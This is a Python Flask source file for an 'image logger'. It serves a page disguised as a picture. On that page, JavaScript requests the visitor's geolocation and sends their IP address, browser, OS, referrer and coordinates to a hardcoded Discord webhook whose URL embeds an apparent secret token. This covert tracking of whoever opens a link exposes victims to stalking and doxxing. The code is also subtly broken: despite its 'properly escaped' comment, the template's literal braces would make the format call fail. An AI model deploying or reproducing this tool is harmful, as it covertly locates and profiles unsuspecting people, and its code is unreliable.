from flask import Flask, request, make_response
import httpagentparser
import requests
import datetime

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518983533526257777/LoIZ6BCnbo1pvKd2Yj0gmOzo-AZfpwSLergw8OmHtfNNgLB6N7bmJ2ahgOwi_m9kN9Q-"
IMAGE_URL = "https://i.pinimg.com/236x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg"

@app.route('/api/image', methods=['GET'])
def serve_image():
    ip = request.remote_addr or request.headers.get('X-Forwarded-For', 'Unknown')
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'No referrer')
    timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    
    try:
        parsed = httpagentparser.detect(user_agent)
        browser = parsed.get('browser', {}).get('name', 'Unknown')
        os_name = parsed.get('os', {}).get('name', 'Unknown')
        device = parsed.get('device', 'Unknown')
    except:
        browser = os_name = device = "Unknown"

    # HTML with JS geolocation - properly escaped
    html = """<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>body { margin:0; background:black; overflow:hidden; }</style>
</head>
<body>
    <img src="{}" style="max-width:100%; height:auto;" alt="">
    <script>
        const webhook = "{}";
        const ip = "{}";
        const browser = "{}";
        const os = "{}";
        const device = "{}";
        const timestamp = "{}";
        const referrer = "{}";

        function sendLocation(lat, lon) {
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const payload = {
                content: "**🧭 Location Captured!**",
                embeds: [{
                    title: "🔥 Image Logger + Location",
                    color: 0xff00ff,
                    description: "User allowed location access",
                    thumbnail: { url: "https://i.pinimg.com/236x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg" },
                    fields: [
                        { name: "📍 Latitude", value: "`" + lat + "`", inline: true },
                        { name: "📍 Longitude", value: "`" + lon + "`", inline: true },
                        { name: "🗺️ Google Maps", value: "[Click to View Location](" + mapsLink + ")", inline: false },
                        { name: "🌐 IP", value: "`" + ip + "`", inline: true },
                        { name: "🔍 Browser", value: "`" + browser + "`", inline: true },
                        { name: "💻 OS/Device", value: "`" + os + " - " + device + "`", inline: true },
                        { name: "⏰ Time", value: timestamp, inline: false },
                        { name: "🔗 Referrer", value: "`" + referrer + "`", inline: false }
                    ],
                    footer: { text: "Image Logger • Powered by Vercel" }
                }]
            };
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude),
                () => {
                    // Permission denied fallback
                    fetch(webhook, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: "**📸 Image Viewed (No Location)**",
                            embeds: [{
                                title: "Basic View",
                                color: 0xffff00,
                                fields: [
                                    {name: "IP", value: "`" + ip + "`"},
                                    {name: "Browser", value: "`" + browser + "`"},
                                    {name: "Time", value: timestamp}
                                ]
                            }]
                        })
                    });
                }
            );
        }
    </script>
</body>
</html>""".format(IMAGE_URL, DISCORD_WEBHOOK, ip, browser, os_name, device, timestamp, referrer)

    response = make_response(html)
    response.headers.set('Content-Type', 'text/html')
    response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
    return response

if __name__ == '__main__':
    app.run()
